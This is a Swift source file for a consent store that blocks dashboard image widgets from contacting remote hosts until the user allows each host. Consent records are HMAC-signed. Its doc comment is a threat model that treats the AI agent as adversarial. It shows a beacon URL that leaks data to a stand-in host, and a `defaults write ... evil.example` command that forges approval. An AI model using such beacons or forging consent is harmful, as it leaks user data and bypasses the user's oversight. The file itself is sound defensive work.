import Foundation

/// Which remote image hosts the user has agreed to let a project's
/// dashboard contact.
///
/// **The problem (P8 SEC-M4).** An image widget in `.scarf/dashboard.json`
/// fires its request the moment the dashboard renders: no click, no
/// chrome, nothing to decline — and the dashboard re-renders on every
/// watcher tick. `dashboard.json` is written by the agent. So the widget is
/// a beacon the agent aims: `https://x.example/p.png?d=<whatever it wants
/// to say>` is a GET made from the user's machine, through the user's
/// network, reporting the user's IP, repeatedly, to a host the user never
/// chose. Restricting the scheme to `https` (which shipped earlier) closed
/// the local-file read and the plaintext channel; it did not and could not
/// close this, because a remote image IS a request.
///
/// **The gate.** First render of a host shows a placeholder naming it, with
/// an Allow button. Nothing is fetched until the user presses it. The
/// answer is remembered per (project, host) so a dashboard the user has
/// blessed doesn't nag on every tick, and it is scoped to the HOST rather
/// than the URL so an agent can't re-ask its way through by changing the
/// path — and so allowing one image doesn't allow a different server.
///
/// **Where it lives, and why not on disk.** In `UserDefaults`, in the app's
/// own container. Every candidate inside `~/.hermes` — the project's
/// `.scarf/`, the registry directory, a sidecar beside the grants file — is
/// writable by the agent whose dashboard is doing the asking, and a consent
/// record the asker can write is not a consent record (the same reasoning
/// that put the mini-app grant key in the Keychain and made the grants file
/// per-machine). This is a decision a person made at a machine; it does not
/// travel with the repo and must not.
///
/// **…but the carrier is not the gate.** "The app's own container" is a
/// weaker claim than it reads: the agent this widget belongs to has a
/// terminal, and
/// `defaults write <bundle> com.scarf.imageWidget.allowedHosts.<path> -array
/// evil.example` pre-approves the beacon without the user ever seeing the
/// card. Being harder to reach than `~/.hermes` is not the same as being out
/// of reach. So each record is HMAC-tagged with the machine key
/// `MiniAppGrantSigner` already mints and keeps in the login Keychain, over
/// `(version, projectId, host)` — Scarf can mint the tag, the agent cannot,
/// and a record that doesn't verify is not a record: it is ignored, the card
/// comes back, and the user is asked. `UserDefaults` stays the carrier; it
/// just stopped being trusted.
///
/// A tag is bound to the project id it was recorded under (the project
/// ROOT, on the surfaces that lack a UUID). That binds the consent to a
/// path rather than to a project identity, so a registry row rewritten to
/// point at a previously-blessed path still inherits that path's
/// allowlist. Closing THAT needs a stable uuid on the widget surface, which
/// the dashboard environment doesn't carry today; the tag is already
/// composed so the id can be swapped for a uuid without a format change.
///
/// Local files and project-contained images never reach here — they are
/// resolved under the project root by `WidgetPathResolver` and involve no
/// network at all.
public struct ImageHostConsentStore: Sendable {

    /// Held as a NAME rather than a `UserDefaults` instance so the store
    /// stays a `Sendable` value type (`UserDefaults` is not `Sendable`,
    /// though it is thread-safe). Resolving per call is a dictionary
    /// lookup — these are user-interaction-rate operations.
    private let suiteName: String?
    private let signer: MiniAppGrantSigner
    private static let keyPrefix = "com.scarf.imageWidget.allowedHosts."

    /// Separator inside one stored record (`<host>\u{1F}<tag>`). Structural,
    /// and a normalized host can never contain it — but that is checked
    /// rather than assumed, because the host comes from an agent-written
    /// `dashboard.json`.
    private static let recordSeparator = "\u{1F}"

    /// Payload version. Bumping it invalidates every stored record, which
    /// re-asks — the safe direction, and the only migration this needs.
    private static let payloadVersion = "scarf-image-consent-v1"

    /// - Parameter suiteName: a test-only defaults suite, so a suite can
    ///   allow and revoke without touching the user's real preferences.
    /// - Parameter testServiceSuffix: routes the signing key into a
    ///   test-only Keychain service, so a suite can sign and verify without
    ///   touching the user's real Keychain.
    public nonisolated init(suiteName: String? = nil, testServiceSuffix: String? = nil) {
        self.suiteName = suiteName
        self.signer = MiniAppGrantSigner(testServiceSuffix: testServiceSuffix)
    }

    private nonisolated var defaults: UserDefaults {
        guard let suiteName, let suite = UserDefaults(suiteName: suiteName) else {
            return .standard
        }
        return suite
    }

    /// Whether `url`'s host has been allowed for `projectId`.
    ///
    /// A URL with no host, or one whose host doesn't normalize, is never
    /// allowed: there is nothing to have consented to.
    public nonisolated func isAllowed(url: URL, projectId: String) -> Bool {
        guard let host = Self.normalizedHost(url) else { return false }
        return allowedHosts(projectId: projectId).contains(host)
    }

    /// The hosts this project has a VERIFIABLE consent record for. A record
    /// with no tag, a wrong tag, a tag minted for another project or
    /// another host, or any record at all when the signing key can't be
    /// reached, is not counted — so the widget asks again rather than
    /// fetching on a record it can't attribute to the user.
    public nonisolated func allowedHosts(projectId: String) -> Set<String> {
        var hosts: Set<String> = []
        for record in defaults.stringArray(forKey: Self.key(projectId)) ?? [] {
            guard let (host, tag) = Self.split(record),
                  signer.isValidTag(tag, forPayload: Self.payload(projectId: projectId, host: host))
            else { continue }
            hosts.insert(host)
        }
        return hosts
    }

    /// Record the user's approval of `url`'s host for this project.
    /// Returns the normalized host, or `nil` when there wasn't one — or
    /// when the record could not be TAGGED, because an untagged record is
    /// one this store would refuse to read back anyway, and writing it
    /// would only look like consent to a human reading the plist.
    @discardableResult
    public nonisolated func allow(url: URL, projectId: String) -> String? {
        guard let host = Self.normalizedHost(url),
              !host.contains(Self.recordSeparator),
              let tag = signer.tag(forPayload: Self.payload(projectId: projectId, host: host))
        else { return nil }
        var records = verifiedRecords(projectId: projectId)
        records[host] = tag
        write(records, projectId: projectId)
        return host
    }

    public nonisolated func revoke(host: String, projectId: String) {
        var records = verifiedRecords(projectId: projectId)
        records.removeValue(forKey: host.lowercased())
        write(records, projectId: projectId)
    }

    public nonisolated func revokeAll(projectId: String) {
        defaults.removeObject(forKey: Self.key(projectId))
    }

    /// The host as it is compared and displayed: lowercased, with no
    /// trailing dot (`example.com.` and `EXAMPLE.com` are one host, and
    /// treating them as two would let an agent get a second ask).
    public nonisolated static func normalizedHost(_ url: URL) -> String? {
        guard var host = url.host?.lowercased(), !host.isEmpty else { return nil }
        while host.hasSuffix(".") { host = String(host.dropLast()) }
        return host.isEmpty ? nil : host
    }

    // MARK: - Record plumbing

    /// The stored records that verify, as `host → tag`. A mutation rewrites
    /// from THIS rather than from the raw array, so a poisoned entry that
    /// happened to be sitting in the plist is dropped by the next legitimate
    /// allow/revoke instead of being carried forward.
    private nonisolated func verifiedRecords(projectId: String) -> [String: String] {
        var records: [String: String] = [:]
        for record in defaults.stringArray(forKey: Self.key(projectId)) ?? [] {
            guard let (host, tag) = Self.split(record),
                  signer.isValidTag(tag, forPayload: Self.payload(projectId: projectId, host: host))
            else { continue }
            records[host] = tag
        }
        return records
    }

    private nonisolated func write(_ records: [String: String], projectId: String) {
        if records.isEmpty {
            defaults.removeObject(forKey: Self.key(projectId))
        } else {
            defaults.set(
                records.keys.sorted().map { $0 + Self.recordSeparator + records[$0]! },
                forKey: Self.key(projectId)
            )
        }
    }

    private nonisolated static func split(_ record: String) -> (host: String, tag: String)? {
        let parts = record.components(separatedBy: recordSeparator)
        guard parts.count == 2, !parts[0].isEmpty, !parts[1].isEmpty else { return nil }
        return (parts[0], parts[1])
    }

    /// The bytes the tag covers: version, project, host. Every field that
    /// decides WHAT was consented to and FOR WHOM is in here, so a tag
    /// cannot be lifted from one project's record into another's, or from
    /// one host onto a different host.
    private nonisolated static func payload(projectId: String, host: String) -> String {
        [payloadVersion, projectId, host].joined(separator: recordSeparator)
    }

    /// Keyed by the project id the caller already has (its path, on the
    /// surfaces that lack a UUID) — consent is per project, because a
    /// dashboard the user trusts says nothing about another project's.
    private nonisolated static func key(_ projectId: String) -> String {
        keyPrefix + projectId
    }
}
